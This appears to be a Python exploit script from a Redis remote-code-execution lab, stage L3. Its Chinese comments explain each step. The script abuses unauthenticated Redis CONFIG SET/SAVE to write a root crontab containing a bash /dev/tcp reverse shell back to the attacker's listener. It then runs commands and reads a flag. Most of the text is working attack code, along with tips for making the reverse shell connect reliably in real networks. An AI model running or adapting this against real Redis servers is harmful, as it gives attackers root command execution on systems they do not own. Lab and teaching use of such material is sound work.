"""L3 · 写计划任务反弹 shell，拿容器里的 root

L2 的 webshell 跑在 php 进程里，权限是 www-data。想更进一步，
就得让「root 身份的进程」替我们执行命令 —— 而 cron 就是那个进程。

利用链和 L2 一模一样（CONFIG SET dir + dbfilename + SET + SAVE），
只是换个落点：

    CONFIG SET dir /etc/crontabs    # alpine 的 busybox crond 从这里读
    CONFIG SET dbfilename root
    SET x "\\n\\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/... 0>&1'\\n\\n"
    SAVE

为什么是 /etc/crontabs，不是 Debian 系常见的 /var/spool/cron/crontabs/root：
  两套 cron 实现的差异，踩过才知道 ——
  - Debian 的 cron：crontabs 下的文件必须 600，Redis 写出来是 644，
    判 bad mode 拒读；退到 /etc/cron.d（只要非 root 可写，644 过关），
    又会因为 RDB 的二进制前缀把整个文件当无效 —— 实测打不通。
  - busybox crond（alpine）：逐行解析，坏行跳过，二进制后面那行照样生效，
    644 也不计较。
  所以靶场用 alpine 跑。真实环境碰上 Debian，通常直接转主从复制 RCE，
  这条链就是那个分水岭。

跑法（会占用宿主 4444 端口）：
    python3 03_cron_revshell.py

等 60 秒左右（cron 按分钟触发），连接上来就能执行命令。
"""

import socket
import subprocess
import sys
import time

from _util import connect, find_flag, run, show

LPORT = 4444
REDIS_CONTAINER = "redis-rce-redis"


def callback_ip():
    """取 host.docker.internal 的 IPv4 字面量。

    这是实战里「反弹 shell 死活连不回来」的头号原因：
    域名同时有 A 和 AAAA 记录时，bash 的 /dev/tcp 会优先走 IPv6，
    而容器 / 内网机器往往没有 IPv6 路由，直接
    "connect: Network is unreachable"。

    靶场里让 redis 容器自己解析一遍，拿到 IPv4 塞进 payload，
    比把 host.docker.internal 原样写进去稳得多。
    真实内网渗透用攻击机公网 IP，不会有这问题。
    """
    try:
        r = subprocess.run(
            ["docker", "exec", REDIS_CONTAINER, "getent", "ahostsv4",
             "host.docker.internal"],
            capture_output=True, text=True, timeout=5)
        first = r.stdout.split()
        if first and first[0].count(".") == 3:
            return first[0]
    except Exception:
        pass
    return "host.docker.internal"


CALLBACK = callback_ip()

LINE = ("* * * * * /bin/bash -c "
        "'bash -i >& /dev/tcp/%s/%d 0>&1'" % (CALLBACK, LPORT))

# 前后各塞两个换行。这是整条链最容易翻车的地方：
# RDB 里 key/value 是紧贴着二进制存的，写出来长这样
#     ...\0\x01x@T* * * * * root /usr/bin/bash ...
# 那行以 \0 开头，cron 用 strlen 一量就是空串，整行当坏行丢掉。
# 前面补 \n 才能让我们的 crontab 行独立成行；后面补 \n 是防止
# RDB 的 EOF 字节粘在行尾把命令改坏。
CMD = "\n\n" + LINE + "\n\n"


def main():
    # ---- 先起监听，别等 cron 触发时才发现端口没开 ------------------------
    # 回连目标已经被 resolve 成 IPv4 字面量，所以这里用 0.0.0.0 就够。
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LPORT))
    srv.listen(5)
    srv.settimeout(150)
    print("监听 0.0.0.0:%d，回连地址 %s，等 cron 触发（最长 150s）..."
          % (LPORT, CALLBACK))

    # ---- 写计划任务 -------------------------------------------------------
    s = connect()
    print("\n=== 写入 /etc/crontabs/root ===")
    for label, args in [
        # 必须先关掉 RDB 压缩。redis 默认 rdbcompression yes，保存字符串时
        # 会做 LZF 压缩 —— "* * * * *" 这种重复度极高的内容会被压成二进制，
        # crontab 解析出来就成了乱码。这个坑在真实环境里一模一样存在。
        ("CONFIG SET rdbcompression", ("CONFIG", "SET", "rdbcompression", "no")),
        ("CONFIG SET dir", ("CONFIG", "SET", "dir", "/etc/crontabs")),
        ("CONFIG SET dbfilename", ("CONFIG", "SET", "dbfilename", "root")),
        ("SET x", ("SET", "x", CMD)),
        ("SAVE", ("SAVE",)),
    ]:
        show(label, run(s, *args))
    s.close()

    print("\n写进去的行：")
    print("  " + LINE)
    print("\n等 cron 下一分钟触发...")

    # ---- 等回连 -----------------------------------------------------------
    try:
        conn, peer = srv.accept()
    except socket.timeout:
        print("[-] 超时没等到回连。排查：", file=sys.stderr)
        print("    1) 容器内是不是真以 root 跑：docker exec redis-rce-redis id",
              file=sys.stderr)
        print("    2) cron 有没有在跑：docker logs redis-rce-redis | head",
              file=sys.stderr)
        print("    3) 文件落没落地：docker exec redis-rce-redis ls -l /etc/crontabs/",
              file=sys.stderr)
        return 1

    print("[+] 回连来自 %s:%d —— 进了 redis 容器的 root shell" % (peer[0], peer[1]))
    conn.settimeout(1)

    # 先等 bash 把提示符吐出来。cron 起的 bash 没有 tty，会先报两行警告，
    # 提示符出现才说明它真的准备好读命令了 —— 抢在前面发会石沉大海。
    buf = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            chunk = conn.recv(4096)
        except socket.timeout:
            if buf.rstrip().endswith((b"#", b"$")):
                break
            continue
        if not chunk:
            break
        buf += chunk
        if buf.rstrip().endswith((b"#", b"$")):
            break

    print(buf.decode("utf-8", "replace").strip())
    print("\n=== 执行 id / cat /flag_l3 ===")

    # 一条一条发、每条等到提示符再发下一条。
    # 注意别把几条命令用分号串成一行一次发出去 —— 实测 bash -i 在
    # 非 tty 下偶尔会只回显不执行，逐条走最稳。
    out = b""
    for cmd in (b"id\n", b"cat /flag_l3\n", b"echo __DONE__\n"):
        conn.sendall(cmd)
        t0 = time.time()
        while time.time() - t0 < 5:
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                break
            out += chunk
            if chunk.rstrip().endswith((b"#", b"$")):
                break
        if b"__DONE__" in out:
            break

    text = buf.decode("utf-8", "replace") + out.decode("utf-8", "replace")
    print(text)

    f = find_flag(out.decode("utf-8", "replace") or text)
    conn.close()
    srv.close()

    if f:
        print("[+] L3 flag:", f)
        return 0
    print("[-] 连上了但没读到 flag，看看 /flag_l3 的权限", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
